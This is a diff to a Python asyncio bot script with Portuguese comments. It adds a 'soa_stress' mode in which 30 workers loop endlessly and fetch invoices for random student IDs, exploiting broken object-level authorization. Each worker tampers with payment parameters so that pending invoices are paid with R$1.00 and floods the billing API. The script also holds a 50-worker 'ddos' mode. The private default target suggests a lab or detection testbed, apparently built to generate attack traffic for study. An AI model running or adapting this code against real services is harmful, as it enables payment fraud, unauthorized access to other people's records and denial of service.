@@ -116,6 +116,40 @@ async def worker_human(worker_id, target_url, bot_type, pool):
             # Pausa longa antes de fazer login de novo com outro usuário
             await asyncio.sleep(random.uniform(2.0, 5.0))
 
+async def worker_soa(worker_id, target_url):
+    print(f"[SOA Stress {worker_id}] Iniciado para {target_url}")
+    timeout = aiohttp.ClientTimeout(total=5)
+    conn = aiohttp.TCPConnector(verify_ssl=False)
+    
+    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
+        while True:
+            try:
+                # Gera IDs aleatórios para simular a vulnerabilidade BOLA
+                random_student_id = random.randint(1, 1500)
+                
+                # Requisita as faturas (Isso também força a API a fabricar novas faturas no SQLite se não existirem)
+                async with session.get(f"{target_url}/api/billing/invoices/{random_student_id}") as res:
+                    if res.status == 200:
+                        invoices = await res.json()
+                        
+                        # Se encontrou faturas pendentes, simula o Parameter Tampering
+                        for inv in invoices:
+                            if inv.get('status') == 'PENDING':
+                                # Tentativa de fraude: pagar apenas R$ 1.00
+                                payment_payload = {
+                                    "invoice_id": inv['id'],
+                                    "amount": 1.00
+                                }
+                                async with session.post(f"{target_url}/api/billing/pay", json=payment_payload) as pay_res:
+                                    pass
+                                break # Paga apenas uma e segue em frente
+                                
+            except Exception:
+                pass
+            
+            # Pausa curta para floodar o SOA sem travar o atacante
+            await asyncio.sleep(random.uniform(0.1, 0.5))
+
 async def main():
     target_url = os.getenv('TARGET_URL', 'https://10.10.100.4').rstrip('/')
     bot_type = os.getenv('BOT_TYPE', 'student') 
@@ -124,6 +158,9 @@ async def main():
 
     if bot_type == 'ddos':
         tasks = [asyncio.create_task(worker_ddos(i, target_url)) for i in range(50)]
+        await asyncio.gather(*tasks)
+    elif bot_type == 'soa_stress':
+        tasks = [asyncio.create_task(worker_soa(i, target_url)) for i in range(30)]
         await asyncio.gather(*tasks)
     else:
         while True:
